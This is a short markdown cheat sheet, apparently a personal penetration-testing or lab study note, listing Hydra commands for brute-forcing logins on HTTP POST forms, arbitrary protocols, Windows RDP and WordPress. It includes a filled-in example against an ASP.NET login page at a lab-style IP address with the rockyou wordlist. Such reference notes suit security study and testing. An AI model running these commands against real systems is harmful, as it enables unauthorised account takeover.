# Hydra
___
Index | Topic
--- | ---
**1** | Description
**2** | Commands

## Description

Hydra is a parallelized, fast and flexible login cracker

## Commands

HTTP Post form: `hydra -l <username> -P /usr/share/wordlists/<wordlist> <ip> http-post-form "<loginURL>:<cookie>:<errorMessage>"`

- Example: `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.195.45 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=1N82WicK%2Fi5hMxcsb4nhDiH8zCBqalboqfu6MCGDVl5HMEsF3RWm7UL0wsjz6SXpTw66TG%2Fi2EH25NI2QI1l5g9RdPWwDD9w5a5tKYj2Nl7eWs9coubf8qaXz2fjxORuJaF0n%2BHLNd8pNtytx9YBPQzHvw7w4zEeNDS08P%2Fb6LKus%2FYK&__EVENTVALIDATION=ofbhCfwlCi%2BFmz1wUVHvgBeMl8i2vU%2BiI%2BBU7Nm%2FkmGVlTCPQD3TnE01PICVMG8kFj7RlHBshG4RRj1yU67k8HTRgSm5XI3A8I3kUCS%2BKktOEoRIfEGQrfP7krDUoOqnP%2B5ozVFJWtDiTv0OhN2OO3sjuL7ZHHOjEj2VpL9mwPWh7KMo&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"`
  - You have to change the password and user values in the cookie and replace them with `^USER^` and `^PASS^`

Brute force any protocol: `hydra -P <wordlist> -v <IP> <protocol>`

Brute force usernames as well as passwords `hydra -v -V -u -L <username list> -P <password list> -t 1 -u <ip> <protocol>`

Attack a Windows Remote Desktop with a password list `hydra -t 1 -V -f -l <username> -P <wordlist> rdp://<ip>`

Craft a more specific request for hydra to brute force `hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
